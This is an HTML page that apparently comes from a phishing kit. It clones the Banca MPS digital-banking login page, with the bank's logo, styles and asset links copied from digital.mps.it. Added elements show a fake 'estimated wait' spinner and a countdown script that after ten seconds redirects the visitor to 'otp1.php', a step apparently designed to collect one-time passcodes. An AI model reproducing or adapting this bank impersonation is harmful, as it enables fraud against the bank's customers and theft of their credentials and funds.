<html lang="it" style="overflow-y: scroll; height: 90%; max-height: 500px"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Banca MPS</title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-itunes-app" content="app-id=366805842">
    <link rel="stylesheet" type="text/css" href="./Banca MPS_files/w.login.digitalBanking.min.css">
    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/539Evs44yecoSf-lkJBQzKKj/recaptcha__it.js" crossorigin="anonymous" integrity="sha384-PgjMgugyZfSYa09k4eKSXGZ3KMOWdANfqwe2YidmYXujnpZFz4r5AkLJn1ri1GFt"></script><script src="./Banca MPS_files/jquery-3.4.1.min.js.download"></script>
    <script src="./Banca MPS_files/jquery-ext.js.download"></script>
    <script src="./Banca MPS_files/jquery-ui-1.10.3.customfade.min.js.download" type="text/javascript" defer=""></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment-with-locales.min.js"></script>

<link href="https://digital.mps.it/cmn/assets/js/jquery-3.4.1.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/jquery-migrate-3.1.0.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/jquery-ui-1.12.1.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/jquery.ui.touch-punch.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/detectmobilebrowser.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/assets/js/iscroll.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/js/jquery.mask.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it/cmn/assets/css/cropperjs/cropper.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/bootstrap.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/mpsUI.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/mps.sprite.flag.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/bootstrap-grid.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/bootstrap-reboot.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/assets/css/catalogo/mpsUIMobile.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/w.login.digitalBanking.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/libs/css/w.common.font.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/cmn/libs/css/w.common.reset.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/home.compact.v02.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/home.mediaCompressed.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/home.w.private.responsive.mobileMedia.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/css/home.w.private.responsive.tabletMedia.v02.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it/libs/img/loader/loader4.gif" rel="preload" as="image">
    <link href="https://digital.mps.it/cmn/assets/icons/catalogo/HELP_UI%20Copy%209.svg" rel="preload" as="image">
    <link href="https://digital.mps.it/cmn/assets/icons/catalogo/info%20tooltip_UI.svg" rel="preload" as="image">
    <link href="https://digital.mps.it/cmn/libs/img/logo-complesso-mobile.2x.png" rel="preload" as="image">
    <link href="./Banca MPS_files/iconaSpeechAssistantred.png" rel="preload" as="image">
    <link href="./Banca MPS_files/pub_assistenza_mobile_token.gif" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/loader/loader5.gif" rel="preload" as="image">
    <link href="https://digital.mps.it/cmn/font/widibaicons_0.012.woff" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/pixOverlay.png" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/icon/icon_del.png" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/sprite/sprite_30x30_radio.png" rel="preload" as="image">
    <link href="https://digital.mps.it/libs/img/sprite/sprite_30x30_check.png" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFVZ0b.woff2" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem6YaGs126MiZpBA-UFUK0Zdc0.woff2" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN7rgOUuhp.woff2" rel="preload" as="image">
    <script src="https://www.google.com/recaptcha/api.js" type="text/javascript" async="" defer=""></script>
    <script src="/cmn/assets/js/google/gtmjs.js" type="text/javascript" defer=""></script>
    <script src="/pri/pr/widiba.i18n.jsp?vers=1189026" type="text/javascript" defer=""></script>
    <script src="/cmn/assets/js/jquery-ui-1.10.3.customfade.min.js?vers=1189026" type="text/javascript" defer=""></script>
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery-3.4.1.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery-migrate-3.1.0.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.mps.hack.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery-ui-1.12.1.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.funzioni.iframe.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/icheck.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/catalogo/popper.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/catalogo/tooltip.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.ui.touch-punch.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/detectmobilebrowser.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/iscroll.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/format.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/mps.autoNumeric.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/bluebird.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.facedetection.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.minicolors.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/cropper.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/ext/8bit.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/ext/load-image.all.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/custom/crop.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/smartcrop.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/cropjs/smartcrop-debug.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/no.click.delay.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.flexslider-min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.dataTables.min-1.10.17.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/footable.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/footable.sort.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/footable.integration.plugin.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.qtip.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.autosize.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/mps.encode.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/blocksit.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/blocksit.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.core.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.base.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.detect.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.header.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.dock.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.alert.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.util.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.widget.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.accordion.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.popup.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.banner.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.datatable.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.infobox.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.infobox.contocorrente.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.infobox.carte.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.mobile.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.draggable.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widdy/widiba.widdy.configurations.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widdy/widiba.widdy.core.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widdy/widiba.widdy.animations.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widdy/widiba.widdy.util.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.funzioni.iframe.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/mps.page.pec.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/mps.page.homepage.postbody.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.placeholder.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.infopopup.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.campagneCrm.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.push.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.campagne.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.homepage.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.buonoLineaPromo.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/jquery.lazyscrollloading-min.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/assets/js/jquery.flip.min.js" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.homepage.news.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/widiba.page.homepage.sezioneeconomica.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/libs/js/mps.page.questionarioprotezione.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.2.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.13.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.1.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.8.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.16.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/libs/js/widiba.selectbox.template.19.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/js/jquery.mask.min.js?vers=1189026" rel="preload" as="script">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/mps_padding_margin.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/cropperjs/cropper.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/bootstrap.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/mpsUI.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/mps.sprite.flag.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/bootstrap-grid.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/bootstrap-reboot.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/assets/css/catalogo/mpsUIMobile.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/w.login.digitalBanking.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/libs/css/w.common.font.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/cmn/libs/css/w.common.reset.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/home.compact.v02.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/home.mediaCompressed.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/home.w.private.responsive.mobileMedia.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/css/home.w.private.responsive.tabletMedia.v02.css?vers=1189026" rel="preload" as="style">
    <link href="https://digital.mps.it:443/libs/img/loader/loader4.gif" rel="preload" as="image">
    <link href="https://digital.mps.it:443/cmn/assets/icons/catalogo/HELP_UI Copy 9.svg" rel="preload" as="image">
    <link href="https://digital.mps.it:443/cmn/assets/icons/catalogo/info tooltip_UI.svg" rel="preload" as="image">
    <link href="https://digital.mps.it:443/cmn/libs/img/logo-complesso-mobile.2x.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/loginBI/iconaSpeechAssistantred.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/pb/pub_assistenza_mobile_token.gif" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/loader/loader5.gif" rel="preload" as="image">
    <link href="https://digital.mps.it:443/cmn/font/widibaicons_0.012.woff" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/pixOverlay.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/icon/icon_del.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/sprite/sprite_30x30_radio.png" rel="preload" as="image">
    <link href="https://digital.mps.it:443/libs/img/sprite/sprite_30x30_check.png" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFVZ0b.woff2" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem6YaGs126MiZpBA-UFUK0Zdc0.woff2" rel="preload" as="image">
    <link href="https://fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN7rgOUuhp.woff2" rel="preload" as="image">
</head>

<body class="desktop webkit chrome supported3D noScroll">

    <div class="db_login_70perc urlPrivacyCookie" id="wrapperLogin70perc" data-privacy-check-url="/pri/loginib/checkPrivacyCookie.action?nullnull" data-privacy-set-url="/pri/loginib/setPrivacyCookie.action?nullnull">
        <div id="digitalBankingMain" class="row">
            <div class="smartbanner" style="display:none" id="smartabanner">
                <div class="smartbanner-container">
                    <a href="https://digital.mps.it/pri/login/home_mobile.jsp#" id="smb-close" class="smartbanner-close" data-template="#button-btnCloseSmartBanner">×</a>
                    <span class="smartbanner-icon"></span>
                    <div class="smartbanner-info">
                        <div class="smartbanner-title">Banca MPS</div>
                        <div>Banca Monte dei paschi di Siena S.p.a.</div>
                        <span id="description-banner"></span>
                    </div>
                    <a href="javascript: void(0))" target="_blank" id="buttonBannerLink" class="smartbanner-button">
                        <span id="buttonStore" class="smartbanner-button-text">Apri</span>
                    </a>
                </div>
            </div>
            <div class="container80baseDigital">


                <div class="row">
                    <div class="col-md-24">
                        <div class="row" id="boxNavigationDigitalBanking">
                            <div class="col-12">
                                <div id="backToUserCodeFromPassword" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="btnIndietroPsw" href="javascript: void(0)" data-template="#button-btnIndietroPsw">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                                <div id="backToUserCodeFromPasswordBlue" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="btnIndietroPswBlu" href="javascript: void(0)" data-template="#button-btnIndietroPswBlu">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                                <div id="backToPswFromOtp" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="backToPsw" href="javascript: void(0)" data-template="#button-btnBackToPsw">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                                <div id="backToPswFromFeF" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="backToPswtoFeF" href="javascript: void(0)" data-template="#button-btnBackToPswFromFeF">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                                <div id="backToPswBlueFromNewPsw" class="dB_icon_link_container" style="display: none;">
                                    <a class="dB_link_with_icon" id="btnIndietroNewPsw" href="javascript: void(0)" data-template="#button-btnIndietroNewPsw">
                                        <div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
                                        <h4 class="mps_bold">Indietro</h4>
                                    </a>
                                </div>
                            </div>
                            <div class="col-12" style="height:36px">
                                <div id="close" class="mps_icon_link_container" style="float: right; padding-right: 0;">
                                    <a class="mps_link_with_icon" id="btnIndietroNewPsw" href="javascript: void(0)" onclick="hideOverlay()" tabindex="-1">
                                    </a>
                                </div>
                            </div>
                            <div class="col-2"></div>
                            <div class="col-20">
                                <div class="db_media_center_wrapper db_column_middle"></div>
                                <div class="db_content_login_header">
                                    <div class="db_logo_black" style="background: url(&quot;https://digital.mps.it/libs/img/montedeipaschi_logo_hd.png&quot;) center center no-repeat; height: 88px; top: 20px; margin: 0px auto 20px;"></div>
                                </div>
                            </div>
                            <div class="col-2"></div>

                        </div>
                    </div>
                </div>
                <div class="row db_responsiveRow">
                    <div class="col-md-1" style="
    text-align: center;
"><img src="pass.png"></div>
                    <div class="col-md-1" style="
    text-align: center;
">
    <p style="text-align:center">
	<img src="load.gif" width="110">
	</p><p style="    margin-top:15px;text-align:center;font-size: 110%;">Tempo d'attesa stimato:</p>
<p id="demo" style="margin-top:15px;text-align:center;font-size: 150%;"></p>
	<p></p><br></div></div></div></div></div>
    
    <script>
// Set the date we're counting down to
 countDownDate = moment().add(10,"seconds")

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();

  // Find the distance between now and the count down date
  distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="demo"
  document.getElementById("demo").innerHTML = minutes + "min " + seconds + "sec ";

  // If the count down is finished, write some text
  if (distance < 0) {
    clearInterval(x);
   window.location.href= "otp1.php"
  }
}, 1000);
</script>
    </body></html>